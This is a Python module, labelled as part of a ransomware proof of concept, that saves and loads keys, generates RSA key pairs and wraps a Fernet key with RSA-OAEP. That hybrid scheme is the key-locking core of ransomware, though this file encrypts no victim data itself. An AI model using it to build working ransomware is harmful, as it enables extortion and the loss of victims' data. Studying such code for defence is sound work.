# Key management utilities for ransomware PoC
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.serialization import (
    load_pem_public_key,
    load_pem_private_key,
    Encoding,
    PublicFormat,
    PrivateFormat,
    NoEncryption,
)
from ransomware.logging import logger


class Keys:
    """
    Utility class for loading and saving encryption keys to disk.
    """
    @staticmethod
    def load_key(path: str) -> bytes:
        """
        Load a symmetric encryption key from the specified file path.
        """
        with open(path, 'rb') as f:
            key = f.read()
        logger.info(f"Loaded key from {path}")
        return key

    @staticmethod
    def save_key(path: str, key: bytes) -> None:
        """
        Save a symmetric encryption key to the specified file path.
        """
        with open(path, 'wb') as f:
            f.write(key)
        logger.info(f"Saved key to {path}")

    @staticmethod
    def generate_rsa_keypair():
        """
        Generate an RSA key pair.
        Returns (private_key_pem, public_key_pem) as bytes.
        """
        private = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public = private.public_key()
        priv_pem = private.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption())
        pub_pem = public.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
        logger.info("Generated new RSA key pair (2048-bit)")
        return priv_pem, pub_pem

    @staticmethod
    def encrypt_with_rsa(data: bytes, rsa_public_key_pem: bytes) -> bytes:
        """
        Encrypt bytes using RSA-OAEP with SHA-256.
        data: the plaintext bytes to encrypt (e.g. a Fernet key)
        rsa_public_key_pem: RSA public key in PEM format
        Returns base64-encoded ciphertext.
        """
        public_key = load_pem_public_key(rsa_public_key_pem)
        ciphertext = public_key.encrypt(
            data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            )
        )
        return base64.b64encode(ciphertext)

    @staticmethod
    def decrypt_with_rsa(ciphertext_b64: bytes, rsa_private_key_pem: bytes) -> bytes:
        """
        Decrypt bytes using RSA-OAEP with SHA-256.
        ciphertext_b64: base64-encoded RSA ciphertext
        rsa_private_key_pem: RSA private key in PEM format
        Returns plaintext bytes.
        """
        private_key = load_pem_private_key(rsa_private_key_pem, password=None)
        ciphertext = base64.b64decode(ciphertext_b64)
        return private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            )
        ) 